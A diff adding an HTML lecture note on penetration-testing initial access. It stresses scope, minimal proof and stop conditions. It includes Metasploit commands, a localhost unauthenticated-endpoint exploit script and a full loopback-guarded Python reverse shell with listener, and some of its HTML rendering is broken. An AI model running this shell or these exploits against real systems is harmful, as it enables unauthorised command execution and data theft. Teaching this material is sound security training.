@@ -1,0 +1,440 @@
+<h1 id="initial-access-and-exploitation-basics">Initial Access and Exploitation Basics</h1>
+<h2 id="summary">Summary</h2>
+<p>Initial access is the moment a vulnerability becomes a foothold. This lecture covers the<br />
+discipline of choosing an exploit, proving access minimally, and — critically — <strong>stopping</strong> as<br />
+soon as you have what you need.</p>
+<p>The most common failure mode for beginners is not inability to exploit; it is<br />
+inability to stop. A pentest that turns into an unsupervised takeover of the<br />
+client's environment is a failed engagement even if everything worked.</p>
+<blockquote>
+<p>Companion to <code>ex-01</code>..<code>ex-06</code> (the technical depth) and <code>cs161-04</code> (the<br />
+reasoning about chain construction). This note is the operational judgement.</p>
+</blockquote>
+<h2 id="the-decision-in-order">The decision, in order</h2>
+<pre><code class="language-text">  1. Is the target in scope and reachable?      (tcm-01, tcm-03)
+  2. Does the vulnerability have a known fix?   (if yes: report, do not exploit)
+  3. Is exploitation explicitly permitted?     (ROE, not your judgement)
+  4. What is the SMALLEST proof?
+  5. What is the blast radius of the technique?
+  6. What is my stop condition?
+</code></pre>
+<p><strong>Step 2 matters more than beginners expect.</strong> If a patch exists, the<br />
+finding is "this host is unpatched" and the proof is <code>nmap -sV</code> output.<br />
+Exploiting it proves nothing extra and creates risk. Reserve exploitation for<br />
+cases with no fix, for demonstration impact, or where the client explicitly<br />
+asked.</p>
+<h2 id="proving-access-minimally">Proving access minimally</h2>
+<pre><code class="language-text">  MINIMUM PROOF              NOT NECESSARY
+  ------------------------- --------------------------------------------
+  whoami                     a user account
+  hostname                   a domain admin
+  id                         SYSTEM
+  proof that a specific      reading the entire customer database
+    record is reachable
+  that a write is possible   writing a webshell and leaving it
+  that this host sees        pivot to 40 more hosts
+    the internal network
+</code></pre>
+<p>The right column is where engagements go wrong. The standard is <strong>the<br />
+smallest demonstration that proves the vulnerability is real and<br />
+impactful</strong>. If the finding is "unauthenticated access to a read-only<br />
+endpoint", <code>curl</code> on that endpoint is the whole exploit.</p>
+<h2 id="metasploit-what-it-is-and-when-it-hurts">Metasploit: what it is and when it hurts</h2>
+<pre><code class="language-text">  WHAT IT IS GOOD FOR
+    - fast validation that a CVE is real
+    - enumerating options for an exploit you have not read
+    - session management once you have several footholds
+    - generating a report of what you did
+    - learning the shape of an exploit, by reading the module source
+
+  WHAT IT IS BAD FOR
+    - you learn nothing about the vulnerability
+    - it hides the request it sends, so you cannot explain it
+    - a scanner/matcher is not an exploit
+    - default payloads are noisy and can break fragile services
+    - you will not be able to reproduce it manually if it fails
+
+  RULE: if you cannot run it without Metasploit, you do not understand it.
+        Use Metasploit to confirm, then reproduce by hand.
+</code></pre>
+<h2 id="the-metasploit-workflow-done-properly">The Metasploit workflow, done properly</h2>
+<pre><code class="language-bash"># --- the sequence, with the reasoning visible ---
+msfconsole -q -x &quot;search type:exploit name:smb; exit&quot;
+# ^ read the search results. Note: rank, disclosure date, and whether a
+#   module exists at all. No module often means the CVE is wrong or the
+#   target is misidentified.
+
+msfconsole -q -x &quot;use 0; show options; exit&quot;
+# ^ ALWAYS show options. The defaults are frequently wrong for the target
+#   you actually scanned. Set RHOSTS from YOUR scan, not the example.
+
+msfconsole -q -x &quot;use 0; set RHOSTS 192.168.56.20; set PAYLOAD ...; run; exit&quot;
+# ^ now capture the module's exact source:  show source  -- you will need it
+#   to reproduce manually.
+
+# --- the manual equivalent, which is the actual skill ---
+# No Metasploit, same outcome. This is what you are being taught.
+</code></pre>
+<pre><code class="language-bash"># A worked example: demonstrating an unauthenticated service read.
+# Loopback only. This is the *shape* of an exploit, in plain Python.
+python3 - &lt;&lt;'PY' | tee 01-manual-exploit.txt
+import socket
+
+def exploit(host, port):
+    &quot;&quot;&quot;Connect, send a request that should have required authentication,
+    and see what comes back. The vulnerability is the SERVER'S decision
+    to answer at all - not anything clever in this script.&quot;&quot;&quot;
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(5)
+    s.connect((host, port))
+    s.sendall(b&quot;GET /admin/records HTTP/1.1\r\nHost: localhost\r\n&quot;
+              b&quot;Connection: close\r\n\r\n&quot;)
+    resp = b&quot;&quot;
+    while len(resp) &lt; 8192:
+        chunk = s.recv(4096)
+        if not chunk: break
+        resp += chunk
+    s.close()
+    head, _, body = resp.partition(b&quot;\r\n\r\n&quot;)
+    status = head.split(b&quot;\r\n&quot;)[0].decode(errors=&quot;replace&quot;)
+    print(f&quot;  status : {status}&quot;)
+    print(f&quot;  bytes  : {len(body)}&quot;)
+    return status, body
+
+print(&quot;  === PROOF: unauthenticated access to /admin/records ===&quot;)
+print()
+status, body = exploit(&quot;127.0.0.1&quot;, 8080)
+print()
+if b&quot;401&quot; in status.encode() or b&quot;403&quot; in status.encode():
+    print(&quot;  VERDICT: not vulnerable. The service enforced auth.&quot;)
+elif b&quot;200&quot; in status.encode():
+    print(&quot;  VERDICT: VULNERABLE. 200 without credentials.&quot;)
+    print(&quot;  STOP HERE. That is sufficient evidence. Record:&quot;)
+    print(&quot;    - the exact request sent&quot;)
+    print(&quot;    - the response status and length&quot;)
+    print(&quot;    - a redacted snippet proving the data class&quot;)
+    print(&quot;  Do not read the whole table. Do not enumerate further.&quot;)
+PY
+cat 01-manual-exploit.txt
+</code></pre>
+<p>That last paragraph is the note. The exploit is a socket connection. The<br />
+vulnerability is a server-side authorisation decision. Everything else is<br />
+bookkeeping.</p>
+<h2 id="when-the-exploit-destabilises-the-target">When the exploit destabilises the target</h2>
+<pre><code class="language-text">  If the exploit may crash the service:
+    1. STOP. Do not retry blindly.
+    2. Confirm the service is actually down (check the target, don't assume)
+    3. Contact the technical contact immediately - this is what they are for
+    4. Record exactly what you ran and when
+    5. Do not attempt recovery. That is the client's change process, and
+       their backups, and their outage, not yours.
+
+  If the exploit may corrupt data:
+    same rule. Data damage during a pentest is a reportable incident caused
+    by the tester, and &quot;the CVE description did not mention writes&quot; is not
+    a defence.
+</code></pre>
+<h2 id="stop-conditions-written-before-you-start">Stop conditions, written before you start</h2>
+<pre><code class="language-text">  Write these BEFORE the exploitation phase, and honour them without
+  exception, regardless of how interesting the access turns out to be:
+
+  - I will not proceed beyond &lt;host&gt; unless it is in scope
+  - I will not attempt persistence unless persistence is in the ROE
+  - I will not exfiltrate more than the minimum proving impact
+  - I will not run any exploit whose mechanism I cannot describe to the
+    client's engineer in plain language
+  - I will stop and call on any of:
+      * a service going down
+      * data appearing to be modified
+      * a system I did not expect (a different network, a different org)
+      * credential access I did not anticipate
+  - Maximum simultaneous exploits against one host: 1
+</code></pre>
+<p>The fourth condition is the best one. <strong>If you cannot explain the exploit<br />
+to the client's engineer, you should not have run it.</strong> That single rule<br />
+eliminates most of the genuinely damaging outcomes.</p>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Initial access</strong></td>
+<td>Gaining the first foothold</td>
+</tr>
+<tr>
+<td><strong>Exploit</strong></td>
+<td>Code or technique that leverages a vulnerability</td>
+</tr>
+<tr>
+<td><strong>Payload</strong></td>
+<td>What the exploit does once it succeeds</td>
+</tr>
+<tr>
+<td><strong>Metasploit module</strong></td>
+<td>A packaged exploit</td>
+</tr>
+<tr>
+<td><strong>Meterpreter</strong></td>
+<td>Metasploit's post-exploitation framework</td>
+</tr>
+<tr>
+<td><strong>Reverse shell</strong></td>
+<td>The target connects out to you</td>
+</tr>
+<tr>
+<td><strong>Bind shell</strong></td>
+<td>You connect in to the target</td>
+</tr>
+<tr>
+<td><strong>Blast radius</strong></td>
+<td>Maximum possible damage</td>
+</tr>
+<tr>
+<td><strong>Proof of concept</strong></td>
+<td>Minimal demonstration that a bug is real</td>
+</tr>
+<tr>
+<td><strong>Stop condition</strong></td>
+<td>A predefined circumstance that halts testing</td>
+</tr>
+<tr>
+<td><strong>Known-fix bypass</strong></td>
+<td>Exploiting something that already has a patch</td>
+</tr>
+<tr>
+<td><strong>Blind exploit</strong></td>
+<td>No output; success is inferred from behaviour</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/tcm-04 &amp;&amp; cd ~/aegis/labs/tcm-04
+source ~/aegis/bin/scope-guard.sh
+
+# --- 1. read the module before you run it. always. ---
+cat &gt; 01-module-review.md &lt;&lt;'EOF'
+# Module review checklist
+
+Before running any exploit module, answer all of these **on paper**:
+
+- [ ] `show options` — what am I setting, and are the defaults right for
+      the host I actually scanned?
+- [ ] `show info` — what CVE is this, is there a fix, when was it disclosed?
+- [ ] `show source` — read the module. Does it do anything besides what I
+      expect? (drop a shell? write a file? crash the service?)
+- [ ] Which payload? `windows/meterpreter/reverse_tcp` vs a plain
+      `windows/shell/reverse_tcp` — prefer the quieter one.
+- [ ] What is the blast radius, and what would I do if it crashed the service?
+- [ ] Is exploitation of this specific issue permitted by the ROE?
+- [ ] Is a *patched* version deployed? If so, stop: the finding is
+      &quot;unpatched&quot;, proved by the version string.
+
+If you cannot answer the source question, you are not ready to run it.
+EOF
+echo &quot;written: 01-module-review.md&quot;
+
+# --- 2. the pre-exploitation evidence pack ---
+cat &gt; 02-evidence-template.md &lt;&lt;'EOF'
+# Exploitation evidence pack — one per finding
+
+## Finding
+**Title:** Unauthenticated administrative endpoint
+**Host:** 192.168.56.20:8080
+**CVE / reference:** (if any)
+**Severity:** High
+
+## Pre-condition
+Evidence it was vulnerable BEFORE exploitation, without exploiting:
+- `nmap -sV` output showing version `X`
+- Banner: `Server: SimpleHTTP/0.6 Python/3.13.2`
+- Service is reachable on 192.168.56.0/24 per scan `scan-192.168.56.20`
+
+## The request sent (verbatim, complete, reproducible)
+```http
+GET /admin/records HTTP/1.1
+Host: 192.168.56.20:8080
+Connection: close
+</code></pre>
+<h2 id="the-response">The response</h2>
+<pre><code>HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.13.2
+Content-Length: 14238
+
+[REDACTED - structure shown, 3 sample rows redacted]
+</code></pre>
+<h2 id="proof-that-this-required-no-credentials">Proof that this required no credentials</h2>
+<ul>
+<li>No <code>Cookie</code>, no <code>Authorization</code> header was sent</li>
+<li>Same response from a fresh session with no cookies</li>
+</ul>
+<h2 id="minimum-necessary">Minimum necessary</h2>
+<ul>
+<li>Records fetched: 1 (structure only)</li>
+<li>Data exfiltrated: one redacted row</li>
+<li>NOT attempted: enumeration, full download, modification</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<ul>
+<li>[ ] Move the endpoint behind authentication</li>
+<li>[ ] Restrict by source</li>
+<li>[ ] Remove the dev server</li>
+</ul>
+<pre><code>echo &quot;written: 02-evidence-template.md&quot;
+
+# --- 3. reverse vs bind shell: the security difference, made explicit ---
+python3 - &lt;&lt;'PY' | tee 03-shell-direction.txt
+print(&quot;  REVERSE SHELL (target dials out to you)&quot;)
+print(&quot;    target  -&gt;  attacker :4444&quot;)
+print(&quot;    + works through firewalls and NAT&quot;)
+print(&quot;    + the target's egress is usually allowed&quot;)
+print(&quot;    - your IP is in the target's logs&quot;)
+print(&quot;    - outbound connections are exactly what EDR looks for&quot;)
+print()
+print(&quot;  BIND SHELL (you dial in to the target)&quot;)
+print(&quot;    attacker  -&gt;  target :4444&quot;)
+print(&quot;    + leaves no outbound connection in the logs&quot;)
+print(&quot;    - needs an inbound firewall change on the target&quot;)
+print(&quot;    - fails behind NAT&quot;)
+print()
+print(&quot;  PROFESSIONAL CHOICE&quot;)
+print(&quot;    Use a bind shell where the ROE requires it.&quot;)
+print(&quot;    Otherwise use reverse, but:&quot;)
+print(&quot;      - to a port you control, on your own machine&quot;)
+print(&quot;      - with a unique, high source port per engagement&quot;)
+print(&quot;      - and log every session you open&quot;)
+print()
+print(&quot;  NEVER: an internet-hosted listener. Ever. Your shell is the&quot;)
+print(&quot;  target's command execution; a public listener is a stranger's.&quot;)
+PY
+cat 03-shell-direction.txt
+
+# --- 4. the canonical loopback reverse shell, explained line by line ---
+cat &gt; 04-revshell.py &lt;&lt;'PY'
+#!/usr/bin/env python3
+&quot;&quot;&quot;Reverse shell, loopback only.
+
+This is the shape of every reverse shell you will ever see. Knowing it
+means you recognise it in a detection rule and can write one yourself.
+&quot;&quot;&quot;
+import socket, subprocess, os, sys
+
+HOST, PORT = &quot;127.0.0.1&quot;, int(sys.argv[1]) if len(sys.argv) &gt; 1 else 4444
+
+# GUARD: refuse anything that is not loopback. A reverse shell pointed at
+# a public host is a backdoor, not a lab exercise.
+import ipaddress
+try:
+    if not ipaddress.ip_address(HOST).is_loopback:
+        print(&quot;REFUSED: this lab only connects to loopback&quot;, file=sys.stderr)
+        sys.exit(3)
+except ValueError:
+    print(&quot;REFUSED: HOST must be a literal loopback IP&quot;, file=sys.stderr)
+    sys.exit(3)
+
+print(f&quot;[+] connecting back to {HOST}:{PORT}&quot;)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+def send(cmd: str) -&gt; bytes:
+    s.sendall((cmd + &quot;\n&quot;).encode()); return s.recv(65536)
+
+# tell the operator who we are - every real one does this
+send(f&quot;uid={os.getuid()} cwd={os.getcwd()} user={os.getenv('USER','?')}&quot;)
+
+while True:
+    try:
+        s.recv(4096)                       # prompt
+    except socket.error:
+        break
+    try:
+        line = sys.stdin.readline()
+    except (KeyboardInterrupt, EOFError):
+        break
+    if not line: break
+    cmd = line.strip()
+    if cmd == &quot;exit&quot;: break
+    # -i keeps the pipe open so interactive tools work: the detail that
+    # separates a real shell from `sh -c one-command`
+    p = subprocess.run(cmd, shell=True, capture_output=True,
+                       text=True, timeout=30, executable=&quot;/bin/bash&quot;)
+    out = (p.stdout + p.stderr).encode() or b&quot;(no output)\n&quot;
+    try:
+        s.sendall(out[:60000])
+    except socket.error:
+        break
+s.close()
+PY
+cat 04-revshell.py
+
+echo
+echo &quot;=== the listener side, loopback only, for the test below ===&quot;
+python3 - &lt;&lt;'PY' &gt; listener.log 2&gt;&amp;1 &amp;
+import socket, sys
+s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((&quot;127.0.0.1&quot;, 4444)); s.listen(1)
+print(&quot;[+] listening on 127.0.0.1:4444&quot;, flush=True)
+c, a = s.accept(); print(f&quot;[+] connection from {a}&quot;, flush=True)
+c.sendall(b&quot;whoami &amp;&amp; hostname &amp;&amp; id\n&quot;)
+import time; time.sleep(1)
+print(&quot;[+] received:&quot;, c.recv(4096).decode(errors=&quot;replace&quot;), flush=True)
+c.close()
+PY
+sleep 1
+printf 'id\nhostname\nexit\n' | timeout 10 python3 04-revshell.py 4444 2&gt;&amp;1 | sed 's/^/  /'
+sleep 2
+cat listener.log | sed 's/^/  /'
+rm -f listener.log
+
+# --- 5. post-exploitation is NOT part of this note ---
+cat &gt; 05-scope-boundary.md &lt;&lt;'EOF'
+# Where initial access ends
+
+Initial access is complete the moment you have a working foothold on an
+in-scope host, and the evidence recorded. Everything after that is
+post-exploitation, and it is a **separate authorisation decision**.
+
+Do not treat post-exploitation as the natural continuation of the exploit.
+If the ROE says &quot;prove access to the web server&quot;, you have finished when
+you have `whoami` output on the web server. Reading the application
+database is a different request.
+
+This boundary is what separates a professional engagement from an incident.
+EOF
+echo &quot;written: 05-scope-boundary.md&quot;
+
+# --- 6. evidence integrity: prove your exploit was your exploit ---
+{
+  echo &quot;=== before exploitation, record baseline state ===&quot;
+  date -Iseconds | sed 's/^/  timestamp: /'
+  echo &quot;  host uptime before: $(uptime -p)&quot;
+  echo &quot;  listening before  : $(ss -tln state listening | tail -n +2 | wc -l) sockets&quot;
+  echo
+  echo &quot;  After the engagement, compare. If a service is now down and you&quot;
+  echo &quot;  cannot explain it, that is your report to write before the&quot;
+  echo &quot;  client's incident channel fills up.&quot;
+} | tee 06-baseline.txt
+</code></pre>
+<p><strong>Step 4 is the deliverable</strong>: a reverse shell written line by line, with a loopback guard that<br />
+exits 3 for anything else. The comment in the source — <code>what you are being taught</code> — is the<br />
+point of the exercise. Recognising the shape is what makes you able to write a detection<br />
+rule for it in Tier 6.</p>
+<p><strong>Record:</strong> <code>03-shell-direction.txt</code> and <code>04-revshell.py</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>Why is exploiting an already-patched vulnerability usually unnecessary?</li>
+<li>Give the standard for "minimum proof of access".</li>
+<li>Why is a vulnerability scanner not an exploit?</li>
+<li>What does <code>show source</code> tell you, and why is it mandatory before running?</li>
+<li>State the stop condition you would write for a fragile production service.</li>
+<li>Why is a bind shell sometimes the professional choice?</li>
+<li>What do you do the moment an exploit crashes a client service?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Exploitation Framework</strong> → <strong>Initial Access</strong> → <strong>Exploitation Ethics</strong> →<br />
+<strong>Reverse Shell</strong> → <strong>Post-Exploitation</strong> → <strong>Metasploit</strong>.<br />
+<code>tcm-05</code> is where post-exploitation becomes a <em>finding</em> rather than a <em>capability</em>.</p>
